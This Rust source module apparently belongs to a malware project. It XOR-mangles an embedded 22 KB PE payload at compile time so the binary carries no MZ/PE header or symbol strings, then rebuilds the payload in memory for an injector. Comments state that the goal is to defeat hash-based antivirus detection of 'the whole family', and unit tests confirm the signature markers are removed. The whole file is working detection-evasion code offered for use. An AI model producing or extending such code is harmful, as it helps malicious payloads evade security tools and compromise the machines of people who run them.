//! Payload entropy flattening (static-signature reduction, wave 1).
//!
//! `abi::payload::PAYLOAD_AMD64` is today embedded *verbatim* as a 22 KB raw
//! PE block in `.rdata`. That block is the single best static fingerprint in
//! the binary — one fresh hash catches the whole family on every engine.
//!
//! This module re-embeds the same bytes XOR-mangled at const-eval, so the
//! on-disk image carries *no* `MZ`/`PE\0\0` header, no export table, no
//! "Bootstrap" symbol string. The real PE is rebuilt in memory at call time.
//!
//! Keep it honest: this is a *detection-signature* win, not crypto. A
//! determined analyst flips one byte and diff-strings both blobs. The point
//! is to kill cheap hash-based detection, not to beat reversing.

use abi::payload::PAYLOAD_AMD64;

/// Key for the const-eval XOR mangling. A scatter literal; the same key is
/// required to materialize. Change it and the resulting binary's hash
/// changes — that's the whole point of the game.
const KEY: u8 = 0x2C;

/// Length of the embedded payload, as a const so the mangled array is sized
/// at compile time.
const N: usize = PAYLOAD_AMD64.len();

/// The mangled payload: XOR'd at const time, so it is the exact bytes that
/// land in the image. No MZ header survives, hence no `include_bytes` raw-PE
/// signature and no easy `strings` read.
pub const MANGLED: [u8; N] = mangled();

const fn mangled() -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = PAYLOAD_AMD64[i] ^ KEY;
        i += 1;
    }
    out
}

/// Rebuild the real PE payload in memory. Returns the raw bytes a loader /
/// injector can validate (starts with `MZ`) or pass straight to `abi::inject`.
#[inline]
pub fn materialize() -> Vec<u8> {
    let mut out = MANGLED;
    for b in &mut out {
        *b ^= KEY;
    }
    out.to_vec()
}

/// True when the mangled blob has no obvious raw-PE fingerprint left.
#[cfg(test)]
fn mangled_has_no_pe_marker() -> bool {
    let m = &MANGLED;
    !m.starts_with(b"MZ") && !m.windows(4).any(|w| w == b"PE\0\0")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mangled_blob_has_no_pe_marker() {
        assert!(mangled_has_no_pe_marker());
    }

    #[test]
    fn mangled_is_fingerprint_different_from_plain() {
        assert_ne!(&MANGLED[..], &PAYLOAD_AMD64[..]);
    }

    #[test]
    fn materialize_rebuilds_exact_original_bytes() {
        let rebuilt = materialize();
        assert_eq!(rebuilt.len(), N);
        assert_eq!(&rebuilt[..], PAYLOAD_AMD64);
    }

    #[test]
    fn materialized_payload_starts_with_mz() {
        assert!(materialize().starts_with(b"MZ"));
    }

    #[test]
    fn hash_of_embedded_differs_from_plain_payload() {
        use std::hash::{Hash, Hasher};
        let a = std::collections::hash_map::DefaultHasher::new();
        let mut h1 = a;
        MANGLED.hash(&mut h1);
        let mut h2 = std::collections::hash_map::DefaultHasher::new();
        PAYLOAD_AMD64.hash(&mut h2);
        assert_ne!(h1.finish(), h2.finish());
    }
}